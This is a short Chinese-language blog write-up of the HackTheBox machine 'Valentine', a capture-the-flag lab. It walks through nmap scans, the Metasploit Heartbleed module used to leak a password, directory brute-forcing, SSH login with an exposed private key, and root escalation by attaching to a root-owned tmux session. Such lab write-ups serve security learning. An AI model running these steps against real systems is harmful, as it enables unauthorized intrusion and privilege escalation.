---
title: "【HTB Machine】Valentine"
date: 2024-09-05
tags:
  - security
keywords:
  - htb
  - writeup
  - valentine
  - linux
  - ctf
  - heartbleed
  - 靶機攻略
  - 滲透測試
  - 題解
  - 心臟出血
  - 漏洞利用
url: "/posts/HTB/Valentine/"
---

# 【HTB Machine】Valentine

```
LHOST: 10.10.16.13
RHOST: 10.129.11.184
```

```bash
nmap -sCV 10.129.11.184
```

![image1](/images/htb/valentine/image1.png)

```bash
nmap --script vuln 10.129.11.184
```

![image2](/images/htb/valentine/image2.png)

Heartbleed 有心臟出血漏洞

網路上很多 POC, 這邊直接開 metasploit 來攻擊

```bash
msfconsole
search openssl
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 10.129.11.184
set verbose true
run
```

![image3](/images/htb/valentine/image3.png)

有一串看起來像 Base64 的字串，拿去解密

![image4](/images/htb/valentine/image4.png)

看起來像密碼

現在來找使用者名稱

使用 dirbuster 爆破目錄

![image5](/images/htb/valentine/image5.png)

`/dev/hype_key` 看起來很有趣

下載下來後拿去 xxd 會發現是 ssh private key

拿來登入看看，這裡需要通靈一下，使用者名稱是 hype

```bash
chmod 600 hype_key
ssh -i hype_key hype@10.129.11.184 -o PubkeyAcceptedKeyTypes=+ssh-rsa # 加上 PubkeyAcceptedKeyTypes 是因為這個 key 太舊而不會被新版的 ssh 接受
```

![image6](/images/htb/valentine/image6.png)

# User Pwned!!!

## 提權

看看歷史指令紀錄

```bash
history
```

![image7](/images/htb/valentine/image7.png)

這個使用者使用過 `tmux`，開了一個 dev session，照著他的指令打一遍看看

```bash
tmux -S /.devs/dev_sess
```

直接拿到 root shell

![image8](/images/htb/valentine/image8.png)

# Root Pwned!!!

## Summary

這題除了通靈使用者名稱外還算簡單，下次有空來試試看不用 metasploit 的方式來 exploit Heartbleed
